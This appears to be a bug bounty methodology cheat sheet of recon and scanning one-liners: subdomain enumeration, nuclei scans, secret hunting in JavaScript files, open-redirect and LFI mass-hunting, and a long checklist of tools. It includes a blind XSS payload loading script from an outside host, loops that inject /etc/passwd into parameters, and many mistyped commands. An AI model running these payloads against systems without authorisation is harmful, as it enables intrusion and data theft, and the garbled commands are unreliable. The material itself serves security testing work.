# Bug Bounty Methodology
## PART I
    subfinder -dL domains.txt -all -recursive -o subdomains.txt
    cat subdomains.txt | wc -l
    
    curl -s https://crt.sh/\?q\=\amazon.com\&output\=jsom | jq -r '.[].name_value' | grep -Po '(\w+\.\w+\.\w+)$' | anew subdomains.txt
    
    cat subdomains.txt | httpx-toolkit -l subdomains.txt -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt
    cat subdomains_alive.txt | wc -l

    naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt

    dirsearch -l subdomains_alive.txt -x 500,502,429,404,400 -R 5 --random-agent -t 100 -F -o directory.txt -w /usr/share/seclists/common.txt
    cat directory.txt | wc -l

    cat subdomains_alive.txt | gau > params.txt
    cat params.txt | wc -l

    cat params.txt | uro -o filterparam.txt
    cat filterparam.txt | wc -l
    
    cat filterparam.txt | grep ".js$" > jsfiles.txt
    cat jsfiles.txt | uro | anew jsfiles.txt
    cat jsfiles.txt | wc -l

    # use SecretFinder module to extract secret info from jsfile
    cat jsfiles.txt | while read url; do python3 /SecretFinder.py -i $url -o cli >> secret.txt; done
    cat secret.txt | grep aws/username//account_id/heroku           ## use keywords that could reveal secrets
    cat secret.txt | heroku                                         ## recon-understand-try-improve-repeat

    nuclei -list filterparam.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info 
    nuclei -list sorted_param_10k.txt -c 70 -rl 200 -fhr -lfa -t /Nuclei-Template -o nuclei-target.txt -es info 

    ## Shodan.com => Search         ::=> "ssl: 'traget.com' 200"
    ## Shodan.com => Facet Analysis ::=> "ssl: 'traget.com' 200" "http:status/title"

## PART II
    subfinder -d target.coom -all -recursive > subdomains.txt 
    cat subdomains.txt | httpx-toolkit -ports 443,80,8080,8000,8888 -threads 200 > subdomains_alive.txt

    katana -u subdomains_alive.txt -d 5 -ps -pss -waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef wolf,css,png,svg,jpg,wolf2,jpeg,gif,svg -o allurls.txt
    cat allurls.txt | wc- l

    cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
    cat allurls.txt | grep -E "\.js$" >> js.txt

    cat js.txt | nuclei -t /Nuclei-Template/http/exposures/ -c 30

    echo www.target.com | kanata -ps | grep -E "\.js$" | nuclei -t /Nuclei-Template/http/exposures/ -c 30

    dirsearch -u https://www.validator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bkp,cache,cgi,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,sql,sql.gz,http://sql.zip,sql.tar,gz,sql~,swp,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js,.json

    subfinder -d target.com | httpx-toolkit -silent | katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp ></script>' -parameters

    subzy run --targets subdomains_alive.txt --verify-ssl
    # subzy run --targets subdomains_alive.txt --concurrency 100 --hide-fails --verify-ssl

    cat subdomains.txt | grep dashboard
    cat subdomains.txt | grep admin/beta/staging/dev/control/panel/api/old      # Run seperately
 
    python3 corsy.py -i /subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION:Hacked"

    nuclei -list /subdomains_alive.txt -t /Priv8-Nuclei/cors
    nuclei -list /subdomains_alive.txt -tags cves,osint,tech

    cat allurls.txt | gf lfi | nuclei -tags lfi

    bash make-payloads.sh www.target.com
    cat allurls.txt | gf redirect | openredirex -p /Open-Redirect/payloads/burp/www.target.com.txt 

    cat subdomains.txt | nuclei -t /Priv8-Nuclei/crlf/crlf2.yaml -v 
    cat allurls.txt | gf redirect | openredirex

    shortscan https://mam.target.com/ -F        # run twice or trice

## OpenRedirect
    ::=> Google => site:target.com inurl:redir |inurl: redirect | inurl:url | inurl:return | inurl:src=http | inurl:r=http | inurl:goto=http
    ::=> Use chrome extensions as well and use GoogleDorks indepth

## LFI (Local File Inclusion | Directory Traversal Mass Hunting)
    subfinder -d target.com | httpx-tookit | gau | uro | gf lfi | tee domains.txt

    nuclei -list domains.txt -tags lfi

    echo 'sub.target.com' | gau | uro | gf lfi

    nuclei -target 'https://sub.target,.com/home.php?page=about.php' -tags lfi
    nuclei -target 'https://sub.other.com' -tags lfi

    dotdotpwn -m http-url -d 10 -f /etc/passwd -u "http://www.target.com?page=TRAVERSAL" -b -k "root:"

    subfinder -d mylocal.life | httpx-toolkit | gau | uro | gf lfi | qsreplace "/etc/passwd" | while read url; do cirl -slent "$url" | grep "root:x:" && echo "$url is vulnerable"; done;

    echo "target" | qsreplace "/etc/passwd" | while read url; do cirl -slent "$url" | grep "root:x:" && echo "$url is vulnerable"; done;

    paramspider -d vuln.target.com --subs

    dotdotpwn -m http-url -d 10 -f /etc/passwd -u "http://www.target.com?page=TRAVERSAL" -b -k "admin:"
    paramspider -d vuln.target.com --subs

## Checklist
    whois target.com 
    nslookup target.com 
    dig target.com
    
    host -t ns target.com 
    host -t mx target.com 
    
    sublist3r -d target.com

    amass enum -d target.com
    assetfinder --subs-only target.com
    findomain t target.com

    massdns -r resolvers.txt -t A o S-w results.txt subdomains.txt
    httprobe < subdomains.txt> live_subdomains.txt
    httpx -1 subdomains.txt -o live_hosts.txt

    nmap -il live_hosts.txt -oA nmap_scan

    whatweb i live_hosts.txt

    aquatone-discover -d target.com

    waybackurls target.com | tee waybackurls.txt

    gau target.com | tee gau_urls.txt

    hakrawler -url target.com -depth 2 -plain | tee hakrawler_output.txt

    github-search target.com

    gitrob -repo target.com

    fierce domain target.com

    dirsearch -u target.com -e *

    ffuf -w wordlist.txt -u https://target.com/FUZZ

    gowitness file -f live_hosts.txt -P screenshots/

    nuclei -1 live_hosts.txt -t templates/

    metabigor net org target.com

    metagoofil -d target.com -t doc, pdf, xls, docx, xlsx, ppt,pptx -1 100 
    
    theHarvester -d target.com -1 500 -b all

    dnsenum target.com

    dnsrecon -d target.com

    shodan search hostname:target.com

    censys search target.com

    spiderfoot -s target.com -o spider foot_report.html 
    sniper -t target.com

    subfinder -d target.com -o subfinder_results.txt 
    wafw00f target.com

    arjun -u https://target.com -oT arjun_output.txt 
    
    subjack -w subdomains.txt -t 20 -o subjack_results.txt 
    
    meg d 1000 -v /path/to/live_subdomains.txt

    waymore -u target.com -o waymore_results.txt 
    
    unfurl -u target.com -o unfurl_results.txt

    dalfox file live_hosts.txt

    gospider -S live_hosts.txt -o gospider_output/

    recon-ng -w workspace -i target.com

    xray webscan --basic-crawler http://target.com 
    
    vhost -u target.com -o vhost_results.txt

    gf xss tee xss_payloads.txt
    gf sqli tee sqli_payloads.txt
    gf lfi tee lfi_payloads.txt

    gf ssrf | tee ssrf_payloads.txt 
    gf idor | tee idor_payloads.txt
    gf ssti tee ssti_payloads.txt

    git-secrets --scan

    shuffledns -d target.com -list resolvers.txt -o shuffledns_results.txt

    dnsgen -f subdomains.txt | massdns -r resolvers.txt -t A -o S -w dnsgen_results.txt

    mapcidr -silent -cidr target.com -o mapcidr_results.txt

    tko-subs -domains-target.com -data-providers-data.csv

    kiterunner -w wordlist.txt -u https://target.com

    github-dorker -d target.com

    gfredirect -u target.com

    paramspider --domain target.com --output paramspider_output.txt

    dirb https://target.com/ -o dirb_output.txt

    wpscan --url target.com

    cloud_enum -k target.com -1 cloud_enum_output.txt

    gobuster dns -d target.com -t 50 -w wordlist.txt

    subzero -d target.com

    dnswalk target.com

    masscan -il live_hosts.txt -p0-65535 -oX masscan_results.xml

    xsstrike -u https://target.com

    byp4xx https://target.com/FUZZ

    dnsx -1 subdomains.txt -resp-only -o dnsx_results.txt

    waybackpack target.com -d output/

    puredns resolve subdomains.txt -r resolvers.txt -w puredns_results.txt

    ctfr -d target.com -o ctfr_results.txt

    dnsvalidator -t 100 -f resolvers.txt -o validated_resolvers.txt

    httpx -silent -1 live_subdomains.txt -mc 200 title -tech-detect -o httpx_results.txt 
    
    cloud_enum -k target.com -1 cloud_enum_results.txt


## Bug Bounty Recon Tip: One-Line Commands to Find IP Addresses
    1. Find IP Address of a Single Domain: dig short target [.]com | xargs -n 1 -I {} whois -h whois.cymru[.]com | tee IPs.txt
    Explanation: Uses dig to get the IP address of a single domain and whois.cymru[.]com for detailed information, saving the results to IPs.txt.

    2. Find IP Addresses of Multiple Domains: cat domains.txt | xargs -In 1 dig +short xargs -n 1 I whois -h whois.cymru[.]com | tee IPs.txt
    Explanation: Reads domains from domains.txt, retrieves their IP addresses, and fetches detailed information for each, saving the results to IPs.txt.
    
    3. Using Censys to Collect IP Addresses: censys search hackerone[.]com | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr d\"\, tee IPs.txt
    Explanation: Searches Censys for IP addresses associated with hackerone.com, filters and formats the results, and saves them to IPs.txt.